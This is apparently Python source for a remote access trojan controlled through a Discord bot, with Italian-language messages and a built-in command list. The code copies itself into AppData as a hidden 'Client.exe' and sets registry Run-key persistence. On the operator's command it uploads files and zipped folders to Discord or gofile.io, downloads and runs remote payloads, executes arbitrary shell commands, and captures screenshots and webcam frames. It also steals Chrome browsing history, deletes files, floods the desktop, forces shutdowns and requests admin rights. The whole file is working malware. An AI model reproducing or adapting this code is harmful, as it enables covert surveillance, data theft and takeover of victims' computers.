import discord
import os
from discord.ext import commands
import socket
import requests
import pyautogui
import sys
import winreg
import sqlite3
import subprocess
import shutil
import win32file
import win32con
import win32api
import ctypes
import psutil
import time
import threading
import cv2
import platform
import wmi
import random

token = "%TOKEN%"

ID = "%ID%"

def getserver():
    zang = requests.get("https://api.gofile.io/getServer")
    if zang.status_code == 200:
        k = zang.json()
        return k["data"]["server"]


def terminate():
    PID = os.getpid()
    subprocess.call(rf"taskkill /F /PID {PID}")

intents = discord.Intents.all()
intents.message_content = True
Local = os.path.join(os.path.expanduser("~"), "Appdata" , "Local")
bot = commands.Bot(command_prefix = "!" , intents = intents)

percorsocorrente = os.path.realpath(sys.argv[0])
cartellacorrente = os.path.dirname(sys.argv[0])
nomeutente = percorsocorrente.split("\\")[2]
nome = os.path.basename(percorsocorrente)

check = False

iterations = 0

@bot.event
async def on_ready():
    global check
    
    def copyandrename():
        shutil.copy(percorsocorrente , f"{Local}\\{nome}")
        time.sleep(2.0)
        os.rename(os.path.join(Local , nome) , os.path.join(Local , "Client.exe"))
        os.startfile(f"{Local}\\Client.exe")
        terminate()

    def exists():
        if os.path.exists(os.path.join(Local , "Client.exe")):
            return True
        else:
            return False

    def isodler():
        if not os.path.exists(os.path.join(Local , "Client.exe")):
            return "Doesn't exist"
        tempocorrente = os.path.getmtime(sys.argv[0])
        tempoClient = os.path.getmtime(os.path.join(Local , "Client.exe"))
        if tempocorrente < tempoClient:
            return False
        elif tempocorrente > tempoClient:
            return True
        elif tempocorrente == tempoClient and cartellacorrente:
            return None

        
    def isrunning():
        global iterations
        for i in psutil.process_iter():
            if i.name() == "Client.exe":
                iterations += 1
        if iterations > 2:
            return True , iterations
        else:
            return False , iterations
        
    def isspace():
        volume = percorsocorrente.split("\\")[0]
        stats = psutil.disk_usage(volume)
        libero = stats.free
        if libero >= 75000000:
            return True
        else:
            return False
        
    esiste = exists()
    print(f"esiste:{esiste}")
    vecchio = isodler()
    print(f"vecchio:{vecchio}")
    morethanone , numero1 = isrunning()
    print(f"morethanone:{morethanone , numero1}")
    spazio = isspace()
    print(f"spazio:{spazio}")



    if spazio == False:
        print(morethanone , esiste , vecchio)
        os.chdir(percorsocorrente)
        with open("Crash.txt" , "wb" , encoding="utf-8")as file:
            file.write("Not enough space on this disk")
        terminate()
    else:
        pass

    if morethanone == True and esiste == True and vecchio == None:
        print(morethanone , esiste , vecchio)
        print("1")
        while True:
            terminate()
    
    if morethanone == True and esiste == True and vecchio == False:
        print(morethanone , esiste , vecchio)
        print("1")
        while True:
            terminate()

    if morethanone == True and esiste == True and vecchio == True:
        print(morethanone , esiste , vecchio)
        print("2")
        try:
            subprocess.call("taskkill /IM Client.exe /F")
        except:
            pass
        try:
            os.remove(os.path.join(Local , "Client.exe"))
        except:
            try:
                subprocess.call("del /AH Client.exe")
            except:
                pass
        copyandrename()
        check = True
    
    if morethanone == False and esiste == True and vecchio == True:
        print(morethanone , esiste , vecchio)
        print("3")
        subprocess.call("taskkill /IM Client.exe /F")
        try:
            os.remove(os.path.join(Local , "Client.exe"))
            print("rimosso")
        except:
            try:
                os.chdir(Local)
                subprocess.call("del /AH Client.exe")
            except:
                pass
        copyandrename()
        check = True
    
    if esiste == False and vecchio == "Doesn't exist":
        copyandrename()

    if esiste == True and morethanone == False and vecchio == False and percorsocorrente != Local:
          os.startfile(f"{Local}\\Client.exe")
          check = True
          terminate()
    
    if esiste == True and vecchio == None and morethanone == False and nome == "Client.exe":
        check = True
        pass

    print(check)
    if check == True:
        attributi = win32file.GetFileAttributes(percorsocorrente)
        nuovo = attributi | win32con.FILE_ATTRIBUTE_HIDDEN
        try:
            win32file.SetFileAttributes(percorsocorrente , nuovo)
        except:
            pass
        channel = await bot.fetch_channel(ID)
        os.chdir("C:\\Users")
        await channel.send ("https://cdn.discordapp.com/attachments/1080256246852112387/1111349509520371722/Title.png")
        await channel.send(f'currently hosted in {nomeutente}')
        await channel.send("----------------------------------------------------------")
        try:  
            await channel.send("       ".join(os.listdir()))
        except:
            pass
        await channel.send(f"-----------------------------------------{os.getcwd()}---")     


@bot.command()
async def dir(ctx):
    canale = await bot.fetch_channel(ID)
    pref = "!dir"
    testo = ctx.message.content
    cartella = testo[len(pref):].strip()
    try:
        os.chdir(cartella)
        await canale.send(f"--------------------------------------------------------------")
        contenuto = os.listdir()
        contenuto_stringa = "\n".join(contenuto)
        try:
            os.remove("contenuto.txt")
            print("rimosso con successo")
        except FileNotFoundError:
            print("Procedo")
        if len(contenuto_stringa) < 2000:
            await canale.send(contenuto_stringa)
            await canale.send(f"----------------------------------------[  {os.getcwd()}  ]---")
        elif len(contenuto_stringa) > 2000:
            nome = "contenuto.txt"
            with open (nome , "w" , encoding="utf-8") as file:
                file.write(contenuto_stringa)
            with open (nome , "rb") as manda:
                define = discord.File(manda , filename= nome)
                await canale.send(file = define)
                await canale.send(f"-----------------------------------------[  {os.getcwd()}  ]---")
            os.remove("contenuto.txt")
    except PermissionError:
        await canale.send("Accesso negato")
    except FileNotFoundError:
        await canale.send("Percorso inesistente")
        raise  

@bot.command()
async def get(ctx):
    canale = await bot.fetch_channel(ID)
    messaggio = ctx.message.content
    percorso = messaggio[len("!get"):].strip()
    percorso = rf"{percorso}"
    if os.path.getsize(percorso) > 25000000:
        def upload(path , server):
            endpoint = f"https://{server}.gofile.io/uploadFile"
            with open (path , "rb") as file:
                files = {"files": (file.name , file)}
                carica = requests.post(endpoint , files=files)
                data = carica.json()
                if data["status"] == "ok":
                    omega = data["data"]["downloadPage"]
                    return omega
                else:
                    manda = canale.send("Upload fallito")
                    bot.loop.create_task(manda)
        
        manda = canale.send(f"file: {upload(percorso , getserver())}")
        bot.loop.create_task(manda)
    else:
        file = discord.File(percorso)
        manda = canale.send(file=file)
        bot.loop.create_task(manda)




@bot.command()
async def delete(ctx):
    canale = await bot.fetch_channel(ID)
    pref = "!delete"
    testo = ctx.message.content
    percorso = testo[len(pref):].strip()
    try:
        os.remove(rf"{percorso}")
    except FileNotFoundError:
        await canale.send("File non trovato")

@bot.command()
async def txtbomb(ctx):
    canale = await bot.fetch_channel(ID)
    contenuto = ctx.message.content
    contenuto_vero = contenuto[len("!txtbomb"):].strip()
    if len(contenuto_vero) > 0:
        percorsoDskp = os.path.join(os.path.expanduser("~"), "Desktop")
        os.chdir(percorsoDskp)
        num = 1
        for n in range (500):
            nome = f"txt.bomb{num}.txt"
            with open(nome , "x" , encoding= "utf-8") as file:
                file.write(contenuto_vero)
            num += 1
    else:
        await canale.send("Errore, il contenunto deve essere maggiore di 0")

@bot.command()
async def run(ctx):
    messaggio = ctx.message.content
    messaggio_vero = messaggio[len("!run"):].strip()
    try:
        os.startfile(rf"{messaggio_vero}")
    except FileNotFoundError:
        print ("percorso non valido")

@bot.command()
async def downloadrun(ctx):
    messaggio = ctx.message.content
    link  = messaggio[len("!downloadrun"):].strip()
    nome = link.split("/")[-1]
    percorso = os.path.join(os.path.expanduser("~"), "Appdata")
    richiesta = requests.post(link)
    if richiesta.status_code == 200:
        with open (f"{percorso}/{nome}" , "wb") as file:
            file.write(richiesta.content)
        os.startfile(f"{percorso}/{nome}")

@bot.command()
async def screen(ctx):
    canale = await bot.fetch_channel(ID)
    path = os.path.join(os.path.expanduser("~"), "Appdata")
    nome = "screenshot.png"
    screen = pyautogui.screenshot()
    screen.save(f"{path}\{nome}")
    with open (f"{path}\{nome}" , "rb") as file:
        k = discord.File(file)
        await canale.send(file = k)
        try:
            os.remove(f"{path}\{nome}")
        except:
            pass

@bot.command()
async def delall(ctx):
    canale = await bot.fetch_channel(ID)
    testo = ctx.message.content[len("!delall"):].strip()
    try:
        os.chdir(testo)
    except FileNotFoundError:
        await canale.send("Cartella non trovata")
    for item in os.listdir():
        try:
            os.remove (os.path.join(f"{testo}\{item}"))
        except PermissionError:
            await canale.send("Permessi mancanti")

@bot.command()
async def RATautorun(ctx):
    canale = await bot.fetch_channel(ID)
    percorso = os.path.abspath(sys.executable)
    nome = str(random.randint(0 , 999999))
    chiave = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chiave, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, nome, 0, winreg.REG_SZ, percorso)
    winreg.CloseKey(key)
    await canale.send("autorun aggiunto con succeso!")

@bot.command()
async def addto(ctx):
    canale = await bot.fetch_channel(ID)
    messaggio = ctx.message.content
    messaggio = messaggio.split(maxsplit = 2)
    url = messaggio[1]
    percorso = messaggio[2]
    print(percorso)
    nome = url.split("/")[-1]
    richiesta = requests.get(url)
    if richiesta.status_code == 200:
        os.chdir(percorso)
        with open (f"{nome}" , "wb") as file:
            file.write(richiesta.content)

@bot.command()
async def ADDautorun(ctx):
    messaggio = ctx.message.content
    k = messaggio.split(maxsplit = 2)
    percorso = k[1]
    canale = await bot.fetch_channel(ID)
    percorso = os.path.abspath(percorso)
    nome = str(random.randint(0 , 999999))
    chiave = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chiave, 0, winreg.KEY_SET_VALUE)
    try:
        winreg.SetValueEx(key, nome, 0, winreg.REG_SZ, percorso)
        winreg.CloseKey(key)
        await canale.send("autorun aggiunto con succeso!")
    except:
        await canale.send("Impossibile settare l'autorun")

@bot.command()
async def getip(ctx):
    canale = await bot.fetch_channel(ID)
    try:
        IP = requests.get("https://checkip.amazonaws.com")
        if IP.status_code == 200:
            IP = IP.text.strip()
            await canale.send(f"Ip pubblico: {IP}")
            await canale.send(f"Ip locale: {socket.gethostbyname(socket.gethostname())}")
    except:
        await canale.send("Impossibile ottenere l'IP")
        raise

@bot.command()
async def history(ctx):
    listaprof = []
    comando = "taskkill /IM chrome.exe /F"
    subprocess.call(comando , shell=True)
    canale = await bot.fetch_channel(ID)
    try:
        percorso =  (os.path.join(os.path.expanduser("~"), "AppData" , "Local" , "Google" , "Chrome" , "User Data"))
        os.chdir(percorso)
    except FileNotFoundError:
        await canale.send("User non ha chrome")
    oggetti = os.listdir(percorso)
    for oggetto in oggetti:
        if os.path.isdir(os.path.join(percorso , oggetto)) == True:
            if oggetto.startswith("Profile"):
                listaprof.append(oggetto)
    for Profilo in listaprof:
        try:
            totale = os.path.join(percorso , Profilo)
            os.chdir(totale)
            con = sqlite3.connect(f"{totale}/History")
            cursor = con.cursor()
            cursor.execute("SELECT url , title , last_visit_time FROM urls")
            os.chdir("C:\Windows\Temp")
            name = "history.txt"
            with open (name , "w" , encoding = "utf-8") as file:
                risultati = cursor.fetchall()
                for colonna in risultati:
                    url = colonna[0]
                    title = colonna[1]
                    file.write(f"URL: {url}\n")
                    file.write(f"Titolo: {title}\n")
                    file.write("\n")
            with open (name , "rb") as file:
                manda = discord.File(file , filename= "history.txt")
                await canale.send(file=manda)
        except:
            print("")

@bot.command()
async def consolerun(ctx):
    canale = await bot.fetch_channel(ID)
    messaggio = ctx.message.content
    vero = messaggio[len("!consolerun"):].strip()
    try:
        subprocess.call(vero , shell=True)
    except:
        canale.send("Il comando non esiste")

@bot.command()
async def hidefile(ctx):
    canale = await bot.fetch_channel(ID)
    messaggio = ctx.message.content
    vero = messaggio[len("!hidefile"):].strip()
    try:
        attributi = win32file.GetFileAttributes(fr"{vero}")
        att = attributi | win32con.FILE_ATTRIBUTE_HIDDEN
        win32file.SetFileAttributes(vero , att)
    except FileNotFoundError:
        canale.send("Il file non esiste")
    except:
        canale.send("Impossibile nascondere il file")

@bot.command()
async def backgroundset(ctx):
    canale = await bot.fetch_channel(ID)
    messaggio = ctx.message.content
    percorso = messaggio[len("!backgroundset"):].strip()
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, percorso , 0)
    except FileNotFoundError:
        canale.send("Il file non esiste")
    except:
        canale.send("Impossibile impostare il file come sfondo")

@bot.command()
async def openlink(ctx):
    messaggio = ctx.message.content
    link = messaggio[len("!openlink"):].strip()
    comando = f"start {link}"
    subprocess.call(comando , shell=True)

@bot.command()
async def listcommands(ctx):
    canale = await bot.fetch_channel(ID)
    await canale.send("""
    dir    [path to the directory]                             ==>     Manda una lista dei file in una cartella qualsiasi

    get    [path to the file (Must be less than 25MB)]         ==>     Manda il file selezionato nel canale

    delete [path to element]                                   ==>     Cancella un file selezionato 

    txtbomb [message in the file]                               ==>     Crea 500 file .txt nel desktop con un messaggio a scelta

    run  [path to the element]                                  ==>     Apre un file

    downloadrun  [discord file attachment or direct download]   ==>     Scarica un file da un link (preferibilmente discord) e lo apre

    screen                                                      ==>     Manda uno screen del PC del Computer dove il RAT è hostato

    delall   [path to directory]                                ==>     Cancella tutti i file in una cartella (Avente i permessi)

    RATautorun                                                  ==>     Imposta il RAT in autorun (si apre ogni volta che il computer dell'host viene acceso)

    addto   [path to element]                                   ==>     Scarica un file e lo aggiunge ad una cartella a scelta

    ADDautorun    [path to element]                             ==>     Imposta un file in autorun (si apre ogni volta che il computer dell'host viene acceso) a scelta

    getip                                                       ==>     Manda l'IP pubblico e locale del PC dell'host

    history                                                     ==>     Manda la cronologia di Google 

    consolerun  [command (BETA)]                                ==>     Esegue comandi basici nella console del SO (Richiede batch)

    hidefile    [path to file]                                  ==>     Nasconde un file a scelta

    backgroundset [discord link of an image]                    ==>     Imposta un'immagine come sfondo del Desktop

    openlink   [link]                                           ==>     Apre un link tramite console 

    shutdown [1 to shutdown the pc , 2 to restart the pc]       ==>     spegne o riavvia il computer

    netstat [duration]                                          ==>     manda un file txt del netstat

    getdir [directory (MUST BE UNDER 25MB)]                     ==>     comprime la directory e la manda su discord sottoforma di .rar
    
    camera                                                      ==>     manda uno screen della videocamera (se disponibile)

    Greggio                                                     ==>     GET GREGGIO'D

    """)

@bot.command()
async def shutdown(ctx):
    canale = await bot.fetch_channel(ID)
    modes = ["shutdown /s /f /t 0" , "shutdown /r /f /t 0"]
    mess = ctx.message.content
    mode = mess[len("!shutdown"):].strip()
    if mode == "":
        await canale.send("""
        uso: !shutdown 1-2
        [1] = spegne il computer e forza la chiusura dei file
        [2] = riavvia il computer e forza la chiusura dei file
                    """)
    elif mode == "1":
        subprocess.call(fr"{modes[0]}" , shell=True)
    elif mode == "2":
        subprocess.call(fr"{modes[1]}" , shell=True)



@bot.command()
async def netstat(ctx):
    canale = await bot.fetch_channel(ID)
    messaggio = ctx.message.content
    vero_mess = messaggio[len("!netstat"):].strip()

    if vero_mess == "":
        vero_mess = "5"

    if vero_mess.isdigit():

        stop_signal = False

        def timer1(temp):
            while temp != 0:  
                print(temp)
                temp -= 1
                time.sleep(1.0)

        def timer2():
            while not stop_signal:
                processo = subprocess.Popen("netstat" , creationflags=subprocess.CREATE_NO_WINDOW , universal_newlines=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                while stop_signal != True:
                    time.sleep(0.0)
                subprocess.call(fr"taskkill /Pid {processo.pid} /F")
                output , error = processo.communicate()
                os.chdir("C:\Windows\Temp")
                try:
                    os.remove("C:\Windows\Temp\TCP_conn.txt")
                except FileNotFoundError:
                    pass
                with open ("TCP_conn.txt" , "w") as file:
                    file.write(output)
                    ris = discord.File("C:\Windows\Temp\TCP_conn.txt")
                manda = canale.send(file=ris)
                bot.loop.create_task(manda)

        thread1 = threading.Thread(target=timer1 , args=[int(vero_mess),])
        thread2 = threading.Thread(target=timer2)

        thread1.start()
        thread2.start()

        thread1.join()
        stop_signal = True
        thread2.join()
    else:
        manda = canale.send(f"{vero_mess} non è una durata")
        bot.loop.create_task(manda)        

@bot.command()
async def getdir(ctx):
    canale = await bot.fetch_channel(ID)
    messaggio = ctx.message.content
    percorso = messaggio[len("!getdir"):].strip()
    boh = os.path.isdir(percorso)
    if boh == False:
        await canale.send("Il percorso non è una cartella o non esite")
    elif boh == True:
        try:
            link = "https://cdn.discordapp.com/attachments/1109467717355982929/1123239557391978496/Rar.exe"
            req = requests.get(link)
            if req.status_code == 200:
                print("ok")
                content = req.content
                temp = r"C:\\Windows\\temp"
                os.chdir(temp)
                with open ("Rar.exe" , "wb") as file:
                    file.write(content)
                try:
                    attributi = win32file.GetFileAttributes
                    nuovo = attributi | win32con.FILE_ATTRIBUTE_HIDDEN
                    win32file.SetFileAttributes(os.path.join(temp , "Rar.exe") , nuovo)
                except:
                    pass
                comando2 = fr'rar a -ep1 C:\Windows\Temp\Archive.rar "{percorso}"'
                processo = subprocess.call(comando2 , creationflags=subprocess.CREATE_NO_WINDOW)
                peso = os.path.getsize("C:\Windows\Temp\Archive.rar")
                if peso > 25000000:
                    def upload(path , server):
                        endpoint = f"https://{server}.gofile.io/uploadFile"
                        print(endpoint)
                        with open(path , "rb") as file:
                            header = {"files": (file.name , file)}
                            print(endpoint)
                            req = requests.post(endpoint , files=header)
                            if req.json()["status"] == "ok":
                                omega = req.json()["data"]["downloadPage"]
                                mess = canale.send(omega)
                                bot.loop.create_task(mess)
                            else:
                                mess = canale.send("Upload fallito")
                                bot.loop.create_task(mess)
                    upload(r"C:\Windows\Temp\Archive.rar" , getserver())
                    print("fatti!")
                else:
                    with open ("Archive.rar" , "rb") as file:
                        dsfile = discord.File(file , filename="Archive.rar")
                        await canale.send(file = dsfile)
                    os.remove("C:\Windows\Temp\Archive.rar")
        except FileNotFoundError:
            await canale.send("Impossibile trovare il file")
        except:
            pass

@bot.command()
async def camera(ctx):
    canale = await bot.fetch_channel(ID)
    cap = cv2.VideoCapture(0)  
    ret, frame = cap.read()
    if ret:
        os.chdir(r"C:\Windows\Temp")
        cv2.imwrite("screenshot.png" , frame)
    else:
        print("Impossibile catturare il frame")
    cap.release()
    cv2.destroyAllWindows()
    nig = discord.File("C:\Windows\Temp\screenshot.png")
    await canale.send(file = nig)
    os.remove("C:\Windows\Temp\screenshot.png")

@bot.command()
async def info(ctx):
    canale = await bot.fetch_channel(ID)
    await canale.send(f'''Sistema Operativo: {platform.system()}
    Versione: {platform.version()}
    Processore: {platform.processor()}
    RAM: {psutil.virtual_memory().total} , Bytes
    ''')

@bot.command()
async def Greggio(ctx):
    isGreggio = False
    num = 1
    Desktop = os.path.join(os.path.expanduser("~") , "Desktop")
    os.chdir(Desktop)
    try:
        r = requests.get("https://cdn.discordapp.com/attachments/1119749972913553448/1120774775640428714/ezio-greggio-ansa.jpg")
        if r.status_code == 200:
            for n in range (100):
                with open (f"Greggio{num}.jpg" , "wb") as file:
                    file.write(r.content)
                    num += 1
                    if isGreggio == False:
                        ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{Desktop}\\Greggio1.jpg" , 0)
                        isGreggio = True
    except:
        raise

@bot.command()
async def GetAdmin(ctx):
    canale = await bot.fetch_channel(ID)
    def isAdmin():
        try:
            is_admin = (os.getuid() == 0)
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin
    if isAdmin():
        await canale.send("Il programma è già Admin")
    else:
        await canale.send("Non un amministratore, richiedo...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    isAdmin()

@bot.command()
async def hi(ctx):
    channel = await bot.fetch_channel(ID)
    await channel.send("ciao")

while True:
    try:
     bot.run(token)
    except discord.errors.LoginFailure:
        terminate()
    except:
        os.startfile(os.path.abspath(sys.executable))
        terminate()